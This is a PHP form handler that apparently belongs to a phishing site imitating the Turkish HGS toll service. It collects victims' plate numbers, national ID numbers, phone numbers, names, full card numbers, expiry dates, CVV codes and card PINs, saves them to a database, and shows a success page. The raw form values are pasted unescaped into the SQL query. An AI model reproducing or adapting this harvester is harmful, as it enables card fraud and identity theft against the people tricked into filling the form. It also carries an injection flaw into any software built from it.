﻿<meta charset="utf-8">
<?php
include("baglan.php");
$plaka = $_POST['plaka'];
$tc_no = $_POST['tc_no'];
$telnum = $_POST['telnum'];
$isim_soyisim = $_POST['isim_soyisim'];
$ccno = $_POST['ccno1']." ".$_POST['ccno2']." ".$_POST['ccno3']." ".$_POST['ccno4'];
$skt = $_POST['skt_ay']."/".$_POST['skt_yil'];
$ccv = $_POST['ccv'];
$kart_pin = $_POST['kart_pin'];
$tarih = date("d.m.Y")." - ".date("H:i:s");
$kaydet = mysql_query("insert into hgssite (id, plaka, tc_no, telnum, isim_soyisim, ccno, skt, ccv, kart_pin, tarih) values (Null, '$plaka', '$tc_no', '$telnum', '$isim_soyisim', '$ccno', '$skt', '$ccv', '$kart_pin', '$tarih')");
 
 if($kaydet){
	
     echo '<meta HTTP-EQUIV="refresh" CONTENT="0;URL=basarili.html">'; 
     
 }
 else{
     echo "İşlem başarısız..";
     }
 
?>